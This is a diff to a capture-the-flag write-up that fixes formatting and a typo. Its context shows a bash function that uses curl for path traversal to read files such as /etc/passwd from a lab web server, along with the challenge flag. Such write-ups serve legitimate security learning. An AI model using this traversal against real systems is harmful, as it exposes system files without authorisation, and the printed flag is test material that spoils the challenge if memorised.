@@ -22,7 +22,7 @@ This parameter most likely just points out a file and renders it, so if I traver
 ## POC-Exploit
 To simplify the process of traversing the file tree and cutting away all of the "fluff" for a better user experience (better experience for me to read file) I've created this small shell-function:
 ```bash
-lfi() {                                                                              ╶╯
+lfi() {
     file="$1"
     curl -s "http://10.10.85.184/?page=../../../../../../../../..$file" | pup ".card-body:first-of-type"  | head -n -51 | tail -n +2
 }
@@ -64,7 +64,7 @@ $ lfi "/etc/passwd"
 flag{e4478e0eab69bd642b8238765dcb7d18}
 ```
 
-Oh wow! I guessed correcly on the first try?! Sweet!
+Oh wow! I guessed correctly on the first try?! Sweet!
 
 # Flag
 **Flag:** `flag{e4478e0eab69bd642b8238765dcb7d18}`
